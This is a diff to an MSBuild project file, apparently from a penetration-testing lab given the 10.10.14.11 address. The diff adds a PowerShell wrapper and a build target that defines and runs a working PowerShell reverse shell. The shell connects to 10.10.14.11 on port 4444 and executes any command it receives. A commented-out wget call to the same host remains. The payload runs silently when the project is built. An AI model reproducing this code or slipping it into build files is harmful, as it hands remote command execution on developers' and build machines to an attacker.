@@ -5,14 +5,24 @@
         <appname>App1CS</appname>
         <DisableFastUpToDateCheck>true</DisableFastUpToDateCheck>
     </PropertyGroup>
+    <PropertyGroup><PowerShell># 2>nul || type %~df0|find /v "setlocal"|find /v "errorlevel"|powershell.exe -noninteractive -&amp; exit %errorlevel% || #</PowerShell></PropertyGroup>
 
     <!-- Specify the inputs by type and file name -->
     <ItemGroup>
         <CSFile Include = "*.cs"/>
     </ItemGroup>
     
-    <Target Name="BeforeBuild">
-      <Exec Command='powershell.exe -c "wget 10.10.14.11"'/>
+    <Target Name="default">
+      <!-- <Exec Command='powershell.exe -c "wget 10.10.14.11"'/> -->
+      <PropertyGroup>
+        <!-- #3 prefix your powershell script with the $(PowerShell) variable, then code as normal! -->
+        <myscript>$(PowerShell)
+        $client = New-Object System.Net.Sockets.TCPClient('10.10.14.11',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+        </myscript>
+      </PropertyGroup>
+  
+    <!-- #4 and execute the script like this -->
+    <Exec Command="$(myscript)" EchoOff="true" />
     </Target>
 
     <Target Name="Compile">
